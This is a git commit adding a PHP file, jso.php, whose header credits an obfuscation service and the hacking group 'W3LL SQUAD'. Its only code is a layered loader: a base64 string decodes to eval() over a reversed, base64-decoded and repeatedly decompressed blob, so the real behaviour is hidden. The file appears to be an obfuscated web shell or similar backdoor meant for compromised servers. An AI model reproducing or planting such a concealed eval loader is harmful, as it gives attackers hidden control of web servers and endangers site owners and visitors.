e00054aadc813166f5331681aa66f8436ccd05dd
Sad-Boy 1922 <55779203+Sad-Boy-1922@users.noreply.github.com>
2019-11-25 20:16:51 +0700

    Add files via upload

---
+++ jso.php
@@ -0,0 +1,18 @@
+<?php
+/*
+		             The Given Code Was Successfully Obfuscated By L3T3Rzcy And Chu-404
+			                   From : http://chu404.eu5.org/obfus.php
+		                                        
+				                   	 Pokoknya gua ganteng oke
+		                       Contact : clownterror072@gmail.com
+						             		W3LL SQUAD
+						   ####### Copyright ClownTerror072 #######
+*/
+$Cyber = "ZXZhbCUyOCUyNnF1b3QlM0IlM0YlMjZndCUzQiUyNnF1b3QlM0IuZ3p1bmNvbXByZXNzJTI4Z3p1bmNvbXByZXNzJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4Z3ppbmZsYXRlJTI4YmFzZTY0X2RlY29kZSUyOHN0cnJldiUyOCUyNENyaW1lJTI5JTI5JTI5JTI5JTI5JTI5JTI5JTI5JTNC";
+$Crime = "==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";
+eval(htmlspecialchars_decode(urldecode(base64_decode($Cyber))));
+exit;
+?>
+
+
+
